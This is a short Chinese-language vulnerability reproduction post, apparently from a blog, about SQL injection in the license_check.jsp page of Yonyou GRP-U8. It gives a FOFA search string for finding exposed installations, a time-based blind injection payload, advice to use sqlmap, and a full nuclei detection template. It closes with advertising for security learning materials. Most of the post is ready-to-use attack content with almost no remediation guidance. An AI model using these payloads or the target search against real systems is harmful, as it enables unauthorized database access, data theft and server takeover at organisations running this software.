# 原创
：  用友 GRP-U8 存在sql注入漏洞复现

# 用友 GRP-U8 存在sql注入漏洞复现

### 0x01 漏洞介绍

##### 用友 GRP-U8 license_check.jsp 存在sql注入，攻击者可利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

##### fofa：app=”用友-GRP-U8”

### 0x02 POC:

#### /u8qx/license_check.jsp?kjnd=1’;WAITFOR%20DELAY%20’0:0:3’—

### 0x03 sqlmap 一把梭哈

### 0x04 nuclei poc

#### 命令：nuclei -t /nuclei-poc/yonyou/用友-GRP-U8+sql.yaml -u [Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者](https://bbs.zkaq.cn/)

```
id: u8grp_license_check
info:
name: 用友GRP-U8 License Check漏洞
author: YourName
severity: high

requests:
- method: GET
path:
- "{{BaseURL}}/u8qx/license_check.jsp?kjnd=1';WAITFOR%20DELAY%20'0:0:3'--"
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36

req-condition: true
matchers:
- type: dsl
dsl:
- 'contains(body_1, "1")'
condition: and
```

还没看够？可以关注~

## **免费领取安全学习资料包！（私聊进群一起学习，共同进步）**<img alt="" height="768" src="https://img-blog.csdnimg.cn/696e6ebf81ba4e4088ab61199b458bbe.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/652226bb649c48f1ba2d2dcb2dd99994.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/8eb67d8e49b24ba3ad64b228bfc96437.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/79cd596e5b504c3497c8119a197f7dc8.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/e3cb409be92a4dd7affb2420cdf9cfda.png" width="665"/>

应急响应笔记

学习路线
